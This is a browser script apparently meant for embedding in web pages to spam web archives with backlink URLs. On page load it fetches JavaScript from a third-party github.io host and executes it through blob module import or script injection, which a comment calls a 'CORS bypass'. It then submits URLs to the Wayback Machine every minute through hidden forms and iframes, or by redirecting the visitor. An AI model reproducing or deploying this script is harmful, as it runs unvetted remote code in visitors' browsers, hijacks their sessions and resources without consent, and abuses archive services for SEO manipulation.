<script>
/* Injects a stealthIFrameContainer into the current page (no need for a manual <div>)
   Supports random submissions to web.archive.org, ghostarchive.org, and archive.today.
*/

const fetchData = [
  "https://smartbacklinkmaker.blogspot.com/"
];
const fetchURLs = [
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/pinterest-pins.js"
];

const IFRAME_COUNT = 4;
const SUBMIT_INTERVAL = 60000; // 60s

function isValidURL(url) {
  const pattern = /^https?:\/\/[^\s]+$/i;
  return pattern.test(url);
}
function shuffle(array){ for(let i=array.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[array[i],array[j]]=[array[j],array[i]];} }
function normalizeURL(url){ if(typeof url!=='string') return ""; return url.replace(/([^:]\/)\/+/g,"$1"); }
function randomURL(array){ return array[Math.floor(Math.random()*array.length)]; }

/* ============================================================
     üî• UPDATED FUNCTION ‚Äî JS + JSON Support
   ============================================================ */
async function updateDefaultURLs() {

  // helper: import JS as module via blob
  async function importModuleFromText(jsText) {
    const blob = new Blob([jsText], { type: "application/javascript" });
    const moduleURL = URL.createObjectURL(blob);
    try {
      return await import(moduleURL);
    } finally {
      URL.revokeObjectURL(moduleURL);
    }
  }

  // helper: extract array from JSON payload
  function extractFromJSON(data) {
    if (Array.isArray(data)) return data.slice();
    for (const key of ["urls", "items", "data", "list"]) {
      if (Array.isArray(data?.[key])) return data[key].slice();
    }
    return [];
  }

  // helper: extract array from imported JS module
  async function extractFromModule(mod) {
    if (!mod) return [];
    if (Array.isArray(mod.default)) return mod.default.slice();
    for (const key of ["urls", "items", "data", "list"]) {
      if (Array.isArray(mod[key])) return mod[key].slice();
    }
    if (typeof mod.build === "function") {
      const out = await mod.build();
      if (Array.isArray(out)) return out.slice();
    }
    if (typeof mod.load === "function") {
      const out = await mod.load();
      if (Array.isArray(out)) return out.slice();
    }
    return [];
  }

  // fallback: insert <script> and read globals
  function loadViaScriptTag(url) {
    const GLOBAL_KEYS = [
      "REMOTE_URLS", "REMOTE_DATA", "REMOTE_ARRAY",
      "FETCH_JS_DATA", "FETCH_DATA",
      "urls", "items", "pins", "PIN_IDS"
    ];
    return new Promise((resolve) => {
      const script = document.createElement("script");
      script.src = url;
      script.async = true;

      script.onload = () => {
        let result = [];
        for (const key of GLOBAL_KEYS) {
          if (Array.isArray(window[key])) {
            result = window[key].slice();
            try { delete window[key]; } catch(e){}
            break;
          }
        }
        script.remove();
        resolve(result);
      };

      script.onerror = () => {
        script.remove();
        resolve([]);
      };

      document.head.appendChild(script);
    });
  }

  /* main behavior */
  shuffle(fetchURLs);

  for (const u of fetchURLs) {
    console.log("üîé Trying to fetch URL list from:", u);

    const lower = u.toLowerCase();

    /* -------- JSON FILE -------- */
    if (lower.endsWith(".json")) {
      try {
        const r = await fetch(u);
        if (!r.ok) throw new Error("HTTP " + r.status);
        const json = await r.json();
        const arr = extractFromJSON(json);
        if (arr.length) {
          fetchData.length = 0;
          fetchData.push(...arr);
          console.log("‚úÖ Loaded", arr.length, "URLs from JSON:", u);
          return;
        }
      } catch (e) {
        console.warn("‚ö† JSON failed:", u, e?.message);
      }
    }

    /* -------- JS FILE -------- */
    if (lower.endsWith(".js") || lower.endsWith(".mjs")) {

      /* 1Ô∏è‚É£ Try module import (requires CORS) */
      try {
        const r = await fetch(u);
        if (r.ok) {
          const text = await r.text();
          try {
            const mod = await importModuleFromText(text);
            const arr = await extractFromModule(mod);
            if (arr.length) {
              fetchData.length = 0;
              fetchData.push(...arr);
              console.log("‚úÖ Loaded", arr.length, "URLs from JS module:", u);
              return;
            }
          } catch {}
        }
      } catch {}

      /* 2Ô∏è‚É£ Fallback: <script> injection (CORS bypass) */
      const arr = await loadViaScriptTag(u);
      if (arr.length) {
        fetchData.length = 0;
        fetchData.push(...arr);
        console.log("‚úÖ Loaded", arr.length, "URLs from JS script:", u);
        return;
      } else {
        console.warn("‚ö† JS file returned no usable array:", u);
      }
    }

    // Unknown type ‚Üí try JSON then JS fallback
    try {
      const r = await fetch(u);
      if (r.ok) {
        const json = await r.json().catch(()=>null);
        const arr = extractFromJSON(json);
        if (arr.length) {
          fetchData.length = 0;
          fetchData.push(...arr);
          console.log("‚úÖ Loaded", arr.length, "URLs from fallback JSON:", u);
          return;
        }
      }
    } catch {}

    const arr2 = await loadViaScriptTag(u);
    if (arr2.length) {
      fetchData.length = 0;
      fetchData.push(...arr2);
      console.log("‚úÖ Loaded", arr2.length, "URLs from fallback JS:", u);
      return;
    }

    console.warn("‚ö† Failed to load:", u);
  }

  console.warn("‚ö† Using fallback URLs:", fetchData.length);
}

/* ============================================================
   (rest of your original code remains unchanged)
   ============================================================ */

function generateTargetURL() {
  if (!fetchData.length) return "";
  const combined = randomURL(fetchData);
  return normalizeURL(combined);
}

/* Archive site definitions */
const ARCHIVE_SITES = [
      [
        {
          name: "Wayback",
          action: "https://web.archive.org/save",
          method: "POST",
          inputName: "url",
          extraParams: {}
        }
    ]
	/*
    [
        {
          name: "archive.today",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.li",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.vn",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.fo",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.md",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.ph",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        }
    ],
    [
        {
          name: "GhostArchive",
          //action: "https://ghostarchive.org/archive2",
          action: "https://ghostarchive.org/archive",
          method: "POST",
          inputName: "archive",
          extraParams: {}
        }
    ]
	*/
];

function chooseRandomArchive() {
     const randomArray = ARCHIVE_SITES[Math.floor(Math.random() * ARCHIVE_SITES.length)];
     return randomArray[Math.floor(Math.random() * randomArray.length)];
}

function ensureContainer() {
  return document.body || document.documentElement;
}

function buildAndSubmitArchiveForm(site, targetUrl, targetFrameName) {
  if (!site || !targetUrl) return;
  try {
    const form = document.createElement("form");
    form.style.display = "none";
    form.method = site.method || "POST";
    form.action = site.action;
    if (targetFrameName) form.target = targetFrameName;
    else form.target = "_self";

    const urlInput = document.createElement("input");
    urlInput.type = (site.method === "GET") ? "text" : "hidden";
    urlInput.name = site.inputName || "url";
    urlInput.value = targetUrl;
    form.appendChild(urlInput);

    if (site.extraParams) {
      for (const [k, v] of Object.entries(site.extraParams)) {
        const inp = document.createElement("input");
        inp.type = "hidden";
        inp.name = k;
        inp.value = v;
        form.appendChild(inp);
      }
    }

	const container = ensureContainer();
    container.appendChild(form);
    console.log(`üì® Submitting to ${site.name} (${site.action}) via ${site.method} target=${form.target} url=${targetUrl}`);
    form.submit();
    setTimeout(() => { try { form.remove(); } catch(e){} }, 1000);
  } catch (err) {
    console.error("‚ùå buildAndSubmitArchiveForm error:", err);
  }
}

function submitToArchiveInFrame(iframe) {
  try {
    const targetUrl = generateTargetURL();
    if (!targetUrl || !isValidURL(targetUrl)) {
      console.warn("‚ö† Skipping invalid target:", targetUrl);
      return;
    }
    const site = chooseRandomArchive();
    buildAndSubmitArchiveForm(site, targetUrl, iframe.name);
  } catch (err) {
    console.error("‚ùå submitToArchiveInFrame error:", err);
  }
}

function createIframe(i, container) {
  try {
    const iframe = document.createElement("iframe");
    const fname = "hiddenFrame" + i;
    iframe.setAttribute("name", fname);
    iframe.setAttribute("id", fname);
    iframe.classList.add("hidden-iframe");
    iframe.style.width = "100%";
    iframe.style.height = "200px";
    iframe.style.border = "0";
    iframe.src = "about:blank";

    container.appendChild(iframe);

    setTimeout(() => submitToArchiveInFrame(iframe), 250);

    setInterval(() => {
      console.log("‚è± Interval firing for iframe:", fname);
      submitToArchiveInFrame(iframe);
    }, SUBMIT_INTERVAL);
  } catch (err) {
    console.error("‚ùå createIframe error:", err);
  }
}

function submitToArchiveRedirect(url) {
  if (!url || !isValidURL(url)) {
    console.warn("‚ö† Invalid or empty URL for redirect submission:", url);
    return;
  }
  const site = chooseRandomArchive();
  buildAndSubmitArchiveForm(site, url, "_self");
}

function inIframe() {
  try {
    return window.self !== window.top;
  } catch (e) {
    return true;
  }
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    await updateDefaultURLs();
  } catch (e) {
    console.warn("updateDefaultURLs() failed:", e && e.message);
  }


  if (inIframe()) {
	const container = ensureContainer();
    for (let i = 0; i < IFRAME_COUNT; i++) {
      createIframe(i, container);
    }
  } else {
    submitToArchiveRedirect(generateTargetURL());
  }
});
</script>
